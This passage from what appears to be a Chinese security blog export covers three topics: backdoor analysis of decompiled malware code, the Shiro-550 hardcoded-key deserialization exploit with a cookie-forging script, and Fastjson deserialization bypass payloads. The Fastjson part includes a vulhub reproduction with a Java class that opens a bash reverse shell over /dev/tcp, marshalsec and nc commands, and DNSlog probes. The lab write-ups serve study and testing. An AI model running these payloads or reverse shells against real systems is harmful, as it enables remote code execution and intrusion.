然后4030e0函数将40C180的值赋为time 接着call 401D10，跟进去看 返回一个不是数字&amp;&amp;不是小写字母&amp;&amp;不是大写字母的v1（此处返回的是54） 不满足条件接着一直循环 跳出，接着call 401AF0，参数如栈中所示 代码如下，和socket网络通信有关 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int __cdecl sub_401AF0(char *name, u_short hostshort, int a3, char *a4, int a5)&#123; int result; // eax@2 char v6; // [sp+10h] [bp-60Ch]@5 SOCKET s; // [sp+210h] [bp-40Ch]@1 int v8; // [sp+214h] [bp-408h]@1 char buf; // [sp+218h] [bp-404h]@3 int v10; // [sp+618h] [bp-4h]@5 s = 0; v8 = 0; if ( sub_401640((int)&amp;s, name, hostshort) ) return 1; strcpy(&amp;buf, aGet); strcat(&amp;buf, (const char *)a3); strcat(&amp;buf, aHttp1_0); if ( send(s, &amp;buf, strlen(&amp;buf), 0) == -1 ) &#123; closesocket(s); WSACleanup(); return 1; &#125; do &#123; v10 = recv(s, &amp;v6, 512, 0); if ( v10 &lt;= 0 ) &#123; if ( v10 ) &#123; sub_401740(&amp;s); return 1; &#125; continue; &#125; if ( (unsigned int)(v10 + v8) &gt; *(_DWORD *)a5 ) &#123; sub_401740(&amp;s); return 1; &#125; qmemcpy(&amp;a4[v8], &amp;v6, v10); v8 += v10; if ( strstr(a4, asc_40C068) ) break; &#125; while ( v10 &gt; 0 ); if ( sub_401740(&amp;s) ) &#123; result = 1; &#125; else &#123; *(_DWORD *)a5 = v8; result = 0; &#125; return result;&#125; 纵观以上，可以得到401e60主要功能为以下 12345678910111213141516171819202122232425262728293031323334353637int _cdecl sub_401E60(cahr *a1,signed int a2)&#123; signed int result; if(sub_401420(...))&#123; // 获取注册表键并截取 result = 1; &#125; else if(sub_401470(...))&#123; // 获取注册表键 result = 1; &#125; else if(sub_401D80(...))&#123; // 无聊的延时 resutl = 1; &#125; else if(sub_401AF0(...))&#123; // 网络Get和recv result = 1; &#125; else&#123; if(a = strstr(...))&#123; // 字符串匹配 if(b = strstr(...))&#123; if(b - a + 1 &lt;= a2)&#123; memcpy(a1 , ...); // 复制 a1[...] = 0; result = 0; &#125; else&#123; result = 1; &#125; &#125; else&#123; result = 1; &#125; &#125; else&#123; result = 1; &#125; &#125; return result;&#125; 如果获取字符串成功，则进入40204C，可以看到类似于一个后门功能 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465int __cdecl sub_402020(char *name)&#123; const char *v2; // ST2C_4@4 int v3; // ST30_4@4 char *v4; // eax@6 u_short v5; // ST24_2@6 char *v6; // ST28_4@6 char *v7; // eax@10 u_short v8; // ST1C_2@10 char *lpFileName; // ST20_4@10 char *v10; // eax@14 const char *v11; // ST18_4@14 u_short hostshort; // [sp+4h] [bp-424h]@14 FILE *v13; // [sp+8h] [bp-420h]@14 char v14; // [sp+28h] [bp-400h]@1 if ( sub_401E60(&amp;v14, 1024) ) return 1; if ( !strncmp(&amp;v14, aSleep, strlen(aSleep)) ) &#123; strtok(&amp;v14, asc_40C0C0); v2 = strtok(0, asc_40C0C0); v3 = atoi(v2); Sleep(1000 * v3); &#125; else if ( !strncmp(&amp;v14, aUpload, strlen(aUpload)) ) &#123; strtok(&amp;v14, asc_40C0C0); v4 = strtok(0, asc_40C0C0); v5 = atoi(v4); v6 = strtok(0, asc_40C0C0); if ( sub_4019E0(name, v5, v6) ) return 1; &#125; else if ( !strncmp(&amp;v14, aDownload, strlen(aDownload)) ) &#123; strtok(&amp;v14, asc_40C0C0); v7 = strtok(0, asc_40C0C0); v8 = atoi(v7); lpFileName = strtok(0, asc_40C0C0); if ( sub_401870(name, v8, lpFileName) ) return 1; &#125; else if ( !strncmp(&amp;v14, aCmd, strlen(aCmd)) ) &#123; strtok(&amp;v14, asc_40C0C0); v10 = strtok(0, asc_40C0C0); hostshort = atoi(v10); v11 = strtok(0, asc_40C0A4); v13 = _popen(v11, aRb); if ( !v13 ) return 1; if ( sub_401790(name, hostshort, v13) ) &#123; _pclose(v13); return 1; &#125; _pclose(v13); &#125; else &#123; strncmp(&amp;v14, aNothing, strlen(aNothing)); &#125; return 0;&#125; 可以实现cmd，和upload","categories":[{"name":"恶意代码","slug":"恶意代码","permalink":"http://example.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"http://example.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"二进制","slug":"二进制","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]},{"title":"Shiro反序列化漏洞","slug":"shiro","date":"2022-08-06T13:16:50.000Z","updated":"2022-09-01T00:54:12.897Z","comments":true,"path":"2022/08/06/shiro/","link":"","permalink":"http://example.com/2022/08/06/shiro/","excerpt":"","text":"Shiro环境搭建 所需环境 123jdk8u65 Tomcat8shiro 1.2.4 shiro环境直接clone p神的github地址 启动tomcat，即可看到 Shiro550分析漏洞原理 勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字 段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段，那么就 可以利用这个 rememberMe 进行反序列化，从而 getshell。 1234567891011121314151617181920212223242526////RequestPOST /shirodemo_war/login.jsp HTTP/1.1Host: 192.168.124.15:8081Content-Length: 56Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://192.168.124.15:8081Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.124.15:8081/shirodemo_war/login.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeusername=root&amp;password=secret&amp;rememberMe=on&amp;submit=Login////ResponseHTTP/1.1 302 Set-Cookie: JSESSIONID=1467280596697A870D71F2A15C2E5B84; Path=/shirodemo_war; HttpOnlySet-Cookie: rememberMe=deleteMe; Path=/shirodemo_war; Max-Age=0; Expires=Mon, 29-Aug-2022 06:06:08 GMTSet-Cookie: rememberMe=TJ1wpcFQ6EgXmXmmHQ06fysKrMk3tVUeNsh42bYAnXePmFLX+a9DUp7SyfQcdXvFBHHEY0lPYFGP4TtwJA8MgiQVNrol9LIHlwzUlSkz2ZkCUkUYgW0aGK1Ben6bfU1wLp56z/ygIC0x1qXDDYzzRhdMHptkdPOCTJ1DVgtDP51AeESfhuKP/EVJI5JS+e/QTXReg8GtYowZ48PvWTf65YGwp+j+/LNCbn1Wsk1V5xYf9P7q2Xmm6Zh4C5nV2siStTq32oVYtmkowJSV9LCCTsjAZ0Nw+p5tGxsIbmJU3viTOh1PnMKT2XDEiYor7Jr/SKnjsWkYBWSkSvLs+sPRGwVXUVI1LZ3er9UIzsgWse/lOjXdJ8uV71CATvqaG+71HDy9S8byDEdIW1kMh7zigLTEKAp2edgJi3X19vIcoQBkB3ZSJSEcAwG3tCTfyeSnMFJjNa3NmJ+jMyYQO3Q/oZkSbn7fGRG5aIX0OILCDI7Mk9k9YnkIfijo60KrJEcc; Path=/shirodemo_war; Max-Age=31536000; Expires=Wed, 30-Aug-2023 06:06:08 GMT; HttpOnlyLocation: /shirodemo_war/;jsessionid=1467280596697A870D71F2A15C2E5B84Content-Length: 0Date: Tue, 30 Aug 2022 06:06:08 GMTConnection: close 根本原因是AES 加密的密钥默认硬编码在代码里（Shiro-550） cookie解密分析 idea全局查找cookie关键字，发现一下与shiro框架相关的class 123public interface Cookiepublic class SimpleCookie implements Cookiepublic class CookieRememberMeManager extends AbstractRememberMeManager 跟进CookieRememberMeManager查看相关函数 这个方法中先判断cookie base64后是否为deleteme，是的话则返回，否则base解密后返回，看看谁调用了这个方法 跟进convertBytesToPrincipals看看 、 此函数对base64解密后的byte流进行decrypt，然后反序列化。跟进看看 获取cipherService后对bytes解密 其中getDecryptionCipherKey()为获取加解秘钥 跟进cipherService发现使用的是Aes加密，秘钥为base64加密的kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D; 总结上述流程，发现shiro对cookie解密流程为 base64() -&gt; Aes() 之后得到序列化内容 跟进反序列化函数查看 cookie加密分析 在onSuccessfulLogin下断点 可以看到token为明文 跟进 可见和解密过程对称，以上就是cookie加解密全过程 shiro550利用 DNS探测 1234567891011121314151617181920212223242526272829URLDNS链public class urldns &#123; public static void main(String[] args) throws IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123; HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://fudjktkkeq3jv7koksa072r6exkn8c.burpcollaborator.net&quot;); Class urlClass = URL.class; Field fieldHashCode = urlClass.getDeclaredField(&quot;hashCode&quot;); fieldHashCode.setAccessible(true); fieldHashCode.set(url,123456); hashMap.put(url,123); fieldHashCode.set(url,-1); serialize(hashMap); //unSerialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream ooStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); ooStream.writeObject(obj); &#125; public static Object unSerialize(String fileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream oiStrean = new ObjectInputStream(new FileInputStream(fileName)); Object obj = oiStrean.readObject(); return obj; &#125;&#125; python加密脚本 12345678910111213141516171819202122232425from Crypto.Cipher import AESimport uuidimport base64 def convert_bin(file): with open(file,&#x27;rb&#x27;) as f: return f.read() def AES_enc(data): BS=AES.block_size pad=lambda s:s+((BS-len(s)%BS)*chr(BS-len(s)%BS)).encode() key=&quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode=AES.MODE_CBC iv=uuid.uuid4().bytes encryptor=AES.new(base64.b64decode(key),mode,iv) ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data))) return ciphertext if __name__==&quot;__main__&quot;: data=convert_bin(&quot;ser.bin&quot;) print(AES_enc(data))结果：LPWtx1kiT9aPgmH56vw8ertCoG8oAFBmIu3ZtNyaoQtCK9vOekQ4Tx4dKtoxKOsRizCxYoIlWHkHJqvzIZQ5YpgqYEoUVEVqExcCH5xVfbgQD12/ge8euUyZiwIXNouGyO4GbSYEdenS437PYmBvIhQqh3nUrY1KKoVRPOb+F0FxWe9cYXHO/QXvPoLAwIyO/YQte8bW02bYOA26SSKbMLQ4glOTf52JbwLkVB6Shfc4ylY8kDEx34F/E2pwDMk1JNbQfDoUVUAYTN4JEcr4MidEZm5m/1pPnXvvF00A+m+h5ajsDrRRBnOGiqZb6FdHmyh1tA/KUcFMtS29hiEMwDqne0J/9keqnz+9216OF35lWkGcwrOxo7Kab1XCJwM2OR8clh8EtGjO4SQPixNemLcaAPMD23yj5u7d/6EpqmyQ01/93kzt6ATeIjahg9ftNrly9P5oFpF383710PONt5bA80uFU9NY9PRAGstfoITH1hvXynn76HdD3qCZxrqGyP11eQlU1sKByp1ncS9Pqg== 抓包该cookie，利用成功","categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"},{"name":"java框架","slug":"java框架","permalink":"http://example.com/tags/java%E6%A1%86%E6%9E%B6/"}]},{"title":"Fastjson 反序列化漏洞","slug":"fastjson漏洞原理","date":"2022-07-31T13:16:50.000Z","updated":"2022-09-01T00:38:50.463Z","comments":true,"path":"2022/07/31/fastjson漏洞原理/","link":"","permalink":"http://example.com/2022/07/31/fastjson%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/","excerpt":"","text":"fastjson 反序列化漏洞fastjson介绍 在前后端数据传输交互中,经常会遇到字符串(String)与json,XML等格式相互转换与解析，其中json以跨语言，跨前后端的优点在开发中被频繁使用，基本上可以说是标准的数据交换格式。fastjson 是一个java语言编写的高性能且功能完善的JSON库，它采用一种“假定有序快速匹配”的算法，把JSON Parse 的性能提升到了极致。它的接口简单易用，已经被广泛使用在缓存序列化，协议交互，Web输出等各种应用场景中。 FastJson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。 漏洞介绍fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。其实，对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：基于属性基于setter&#x2F;getter 12345678910class Apple implements Fruit &#123; private Big_Decimal price; //省略 setter/getter、toString等&#125;class iphone implements Fruit &#123; private Big_Decimal price; //省略 setter/getter、toString等&#125; 123toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:0.5&#125;&#125;toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:500&#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class Fastjson &#123; public String name; public String age; public Fastjson() throws IOException &#123; this.name=&quot;james&quot;; this.age=&quot;18&quot;; &#125; public void setName(String test) &#123; System.out.println(&quot;name setter called&quot;); this.name = test; &#125; public String getName() &#123; System.out.println(&quot;name getter called&quot;); return this.name; &#125; public void setAge(String test) &#123; System.out.println(&quot;age setter called&quot;); this.age = test; &#125; public String getAge()&#123; System.out.println(&quot;age getter called&quot;); return this.age; &#125; @Override public String toString() &#123; return &quot;Fastjson&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&#x27;&quot; + age + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125; public static void main(String[] args) throws IOException &#123; //ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String o = JSON.toJSONString(new Fastjson()); System.out.println(o); //class转为json System.out.println(&quot;------------&quot;); Fastjson obj = (Fastjson) JSON.parse(&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.fastjson.test.Fastjson\\&quot;,\\&quot;name\\&quot;:\\&quot;test name\\&quot;, \\&quot;age\\&quot;:\\&quot;test age\\&quot;&#125;&quot;); System.out.println(obj); //普通json对象转为object类 &#125;&#125;output://age getter calledname getter called&#123;&quot;age&quot;:&quot;18&quot;,&quot;name&quot;:&quot;james&quot;&#125;------------name setter calledage setter calledFastjson&#123;name=&#x27;test name&#x27;, age=&#x27;test age&#x27;&#125; 12345678为了解决上述问题：fastjson引入了AutoType，即在序列化的时候，把原始类型记录下来。&#123; &quot;fruit&quot;:&#123; &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Apple&quot;, &quot;price&quot;:0.5 &#125;&#125; fastjson 在反序列化的时候会去找我们在 @type 中规定的类是哪个类，然后在反序列化的时候会自动调用这些 setter 与 getter 方法的调用，注意！并不是所有的 setter 和 getter 方法。 下面直接引用结论，Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用： 1234567891011满足条件的setter：- 非静态函数- 返回类型为void或当前类- 参数个数为1个满足条件的getter：- 非静态方法- 无参数- **返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong** 我个人理解 fastjson 的利用攻击其实是蛮简单的，因为没有那么多复杂的链子，也不需要反射修改值，直接在 json 串里面赋值就好了。 漏洞原理由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。 通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。 那么如何才能够反序列化出恶意类呢？ 由前面demo知道，Fastjson使用parseObject()&#x2F;parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写Object o = JSON.parseObject(poc,Object.class)就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。 如何才能触发反序列化得到的恶意类中的恶意函数呢? 由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。 我们到DefaultJSONParser.parseObject(Map object, Object fieldName)中看下，JSON中以@type形式传入的类的时候，调用deserializer.deserialize()处理该类，并去调用这个类的setter和getter方法： 1234567public final Object parseObject(final Map object, Object fieldName) &#123; ... // JSON.DEFAULT_TYPE_KEY即@type if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; ... ObjectDeserializer deserializer = config.getDeserializer(clazz); return deserializer.deserialze(this, clazz, fieldName); 整个解析过程相当复杂，知道结论就ok了。 小结一下若反序列化指定类型的类如Student obj = JSON.parseObject(text, Student.class);，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞； 123456public void setName(String test) throws IOException &#123; System.out.println(&quot;name setter called&quot;); Runtime.getRuntime().exec(&quot;calc&quot;); this.name = test; &#125;//弹出calc 若反序列化未指定类型的类如Object obj = JSON.parseObject(text, Object.class);，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞； PoC 写法一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类 12345&#123;&quot;@type&quot;:&quot;xxx.xxx.xxx&quot;,&quot;xxx&quot;:&quot;xxx&quot;,...&#125; 关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件： 该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行； 可以控制该漏洞函数的变量（一般就是该类的属性）； 漏洞Demo由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);时，反序列化得到的类的构造函数、所有属性的setter方法、properties私有属性的getter方法都会被调用，因此我们这里直接做最简单的修改，将Student类中会被调用的getter方法添加漏洞代码，这里修改getProperties()作为演示： 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.util.Properties; public class Student &#123; private String name; private int age; private String address; private Properties properties; public Student() &#123; System.out.println(&quot;构造函数&quot;); &#125; public String getName() &#123; System.out.println(&quot;getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public int getAge() &#123; System.out.println(&quot;getAge&quot;); return age; &#125; // public void setAge(int age) &#123; // System.out.println(&quot;setAge&quot;); // this.age = age; // &#125; public String getAddress() &#123; System.out.println(&quot;getAddress&quot;); return address; &#125; public Properties getProperties() throws Exception&#123; System.out.println(&quot;getProperties&quot;); Runtime.getRuntime().exec(&quot;calc&quot;); return properties; &#125; &#125; FastjsonEasyPoC.java 12345678910111213import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; public class FastjsonEasyPoC &#123; public static void main(String[] args)&#123; String jsonString =&quot;&#123;\\&quot;@type\\&quot;:\\&quot;Student\\&quot;,\\&quot;age\\&quot;:6,\\&quot;name\\&quot;:\\&quot;Drunkbaby\\&quot;,\\&quot;address\\&quot;:\\&quot;china\\&quot;,\\&quot;properties\\&quot;:&#123;&#125;&#125;&quot;; Object obj = JSON.parseObject(jsonString, Object.class); System.out.println(obj); System.out.println(obj.getClass().getName()); &#125; &#125; 很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。 对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景： 漏洞攻防史 v1.2.24之前 @type自动加载类 v1.2.41之前， fastjson默认关闭了autotype支持，并且加入了checkAutotype （过滤@type里的值，黑白名 单过滤） 加载的过程中，fastjson有一段特殊的处理，那就是在具体加载类的时候会去掉className前后的L和后面的分号;，形如Lcom.lang.Thread; Lcom.sun.rowset.JdbcRowSetImpl; v1.2.42 在进行黑白名单检测的时候，fastjson先判断目标类的类名的前后是不是L和;，如果是的话，就截取掉前后的L和;再进行黑白名单的校验 LLcom.sun.rowset.JdbcRowSetImpl;; v1.2.43 fastjson这次在黑白名单判断之前，增加了一个是否以LL未开头的判断 在目标类前面添加[ v1.2.44版本中，fastjson的作者做了更加严格的要求，只要目标类以[开头或者以;结尾 v1.2.47 autoType不开启反而会被攻击。因为在fastjson中有一个全局缓存，在类加载的时候，如果autotype没开启，会先尝试从缓存中获取类，如果缓存中有，则直接返回。java.lang.Class类对应的deserializer为MiscCodec，反序列化时会取json串中的val值并加载这个val对应的类。如果fastjson cache为true，就会缓存这个val对应的class到全局缓存中 v1.2.68 利用异常进行攻击 OOM在fastjson中， 如果@type 指定的类为 Throwable 的子类，那对应的反序列化处理类就会使用到 ThrowableDeserializer而在ThrowableDeserializer#deserialze的方法中，当有一个字段的key也是 @type时，就会把这个 value 当做类名，然后进行一次 checkAutoType 检测。并且指定了expectClass为Throwable.class，但是在checkAutoType中，有这样一约定，那就是如果指定了expectClass ，那么也会通过校验。因为fastjson在反序列化的时候会尝试执行里面的getter方法，而Exception类中都有一个getMessage方法。只需要自定义一个异常，并且重写其getMessage就达到了攻击的目的。 漏洞分析fastjson1.2.24TemplatesImpl 漏洞利用链 1234561.构造一个 TemplatesImpl 类的反序列化字符串，其中 _bytecodes 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 newInstance() 实例化。2.在反序列化过程中，由于getter方法 getOutputProperties()，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：getOutputProperties() -&gt; newTransformer()-&gt; getTransletInstance() -&gt; defineTransletClasses() / EvilClass.newInstance(). payload 1234567&#123; &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;: [&quot;yv66vgAAADQA...CJAAk=&quot;], &quot;_name&quot;: &quot;su18&quot;, &quot;_tfactory&quot;: &#123;&#125;, &quot;_outputProperties&quot;: &#123;&#125;,&#125; 代码 12345678910111213141516public class Fastjson24poc &#123; public static void main(String[] args) &#123; //TemplatesImpl String byteCode = &quot;xxxxxxxxxxxxxxx&quot;; //构造TemplatesImpl的json数据，并将恶意类注入到json数据中 final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;; String payload = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS + &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+byteCode+&quot;\\&quot;],&quot; + &quot;&#x27;_name&#x27;:&#x27;TempletaPoc&#x27;,&quot; + &quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot; + &quot;\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;; System.out.println(payload); //反序列化 Object object = JSON.parseObject(payload, Feature.SupportNonPublicField); &#125;&#125; JdbcRowSetImpl payload 12345&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.25 payload 12345&#123; &quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.42 payload 12345&#123; &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.43 payload 12345&#123; &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[, &#123;&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.44 这个版本主要是修复上一个版本中使用 [ 绕过黑名单防护的问题 fastjson1.2.45 黑名单绕过 payload 123456&#123; &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;, &quot;properties&quot;:&#123; &quot;data_source&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; fastjson1.2.47 payload 1234567891011&#123; &quot;su18&quot;: &#123; &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;su19&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;: true &#125;&#125; fastjson版本探测DNSlog探测 以下POC出网，说明fastjson&lt;&#x3D;1.2.47 1&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;1247.xxxxx.dnslog.cn&quot;&#125;&#125; 以下这个POC出网，说明fastjson&gt;&#x3D;1.2.37 1&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://weffewfddd.dnslog.cn&quot;&#125;:&quot;aaa&quot;&#125; 以下这个POC出网，证明fastjson版本号1.1.16&lt;&#x3D;version&lt;&#x3D;1.2.24 1&#123;&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://xxxdsf.dnslog.cn:9999/POC&quot;,&quot;autoCommit&quot;:true&#125;&#125; 以下这几个POC，只能证明fastjson出网，无法判断fastjson是否存在反序列化漏洞，因为最新的打了补丁的fastjson也是能发起DNS请求的。 12345&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;sdffsd.dnslog.cn&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxxxx.dnslog.cn&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;wefewffw.dnslog.cn&quot;&#125;&#125; 报错判断 提交一下两个POC，会抛出异常，有时候会显示出fastjson版本号来。 12345&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;[&quot;test&quot;:1] 输入一些乱码字符，让web应用报错，有时候也会带出来版本号 vulhub漏洞复现fastjson1.2.24 docker启动环境 kali创建TouchFile文件用来反弹shell。 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class TouchFile &#123;static &#123; try &#123; Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.5.143/4444 0&gt;&amp;1&quot;&#125;); p.waitFor(); &#125; catch (Exception e) &#123; // do nothing &#125; &#125;&#125; python起一个http服务 1python2 -m SimpleHTTPServer marshalsec启动RMI服务器 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.110.141:4433/#TouchFile&quot; 9988 kali上用NC开启端口监听 1nc -lvvp 4444 抓包改为POST包 1234567891011121314151617POST / HTTP/1.1Host: 192.168.110.141:8090User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36Accept: */*Accept-Encoding: gzip, deflateAccept-Language: enConnection: closeContent-Type: application/jsonContent-Length: 165&#123; &quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://192.168.110.141:9988/TouchFile&quot;, &quot;autoCommit&quot;:true &#125;&#125; 弹到shell fastjson1.2.27payload总结JdbcRowSetImpl 12345&#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;: true&#125; TemplatesImpl 1234567&#123; &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;: [&quot;yv66vgA...k=&quot;], &#x27;_name&#x27;: &#x27;su18&#x27;, &#x27;_tfactory&#x27;: &#123;&#125;, &quot;_outputProperties&quot;: &#123;&#125;,&#125; JndiDataSourceFactory 123456&#123; &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;, &quot;properties&quot;: &#123; &quot;data_source&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; SimpleJndiBeanFactory 1234567891011&#123; &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;, &quot;targetBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;propertyPath&quot;: &quot;su18&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, &quot;shareableResources&quot;: [ &quot;ldap://127.0.0.1:23457/Command8&quot; ] &#125;&#125; DefaultBeanFactoryPointcutAdvisor 12345678910111213&#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, 